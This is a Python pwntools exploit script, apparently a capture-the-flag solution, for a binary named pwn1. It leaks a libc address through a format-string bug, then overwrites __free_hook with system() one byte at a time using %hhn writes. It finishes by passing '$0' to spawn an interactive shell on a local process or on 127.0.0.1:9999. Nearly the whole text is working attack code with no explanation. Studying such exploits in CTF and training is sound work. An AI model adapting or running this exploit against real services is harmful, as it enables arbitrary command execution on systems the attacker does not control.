#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./pwn1", env = {"LD_PRELOAD": "./libc.so.6"})
    elf = ELF("./pwn1")
    libc = ELF("./libc.so.6")

else:
    io = remote("127.0.0.1", 9999)
    elf = ELF("./pwn1")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def DEBUG():
	raw_input("DEBUG: ")
	gdb.attach(io)


def fsb(payload):
    io.sendlineafter("Code:\n", "1")
    #  DEBUG()
    io.sendafter("2017:\n", payload)

def getBase():
    fsb(cyclic(1000) + "||%397$p")
    io.recvuntil("0x")
    libcBase = int(io.recvuntil("\n", drop = True), 16) - 240 - libc.symbols["__libc_start_main"]
    success("libcBase -> {:x}".format(libcBase))
    return libcBase

def overwrite(libcBase):
    freeHook = libcBase + libc.symbols["__free_hook"]
    systemAddr = p64(libcBase + libc.symbols["system"])
    oneGadget = 0x45216 + libcBase
    oneGadget = p64(oneGadget)

    for i in xrange(8):
        payload = cyclic(1000) + "||%" + str(0x100 - 0xfe + ord(systemAddr[i])) + "c%133$hhn"
        payload = payload.ljust(1016, 'a')
        payload += p64(freeHook + i)
        fsb(payload)

if __name__ == "__main__":
    libcBase = getBase()
    overwrite(libcBase)

    io.sendlineafter("Code:\n", "2")
    io.sendlineafter("Name:\n", "$0")

    io.interactive()
    io.close()
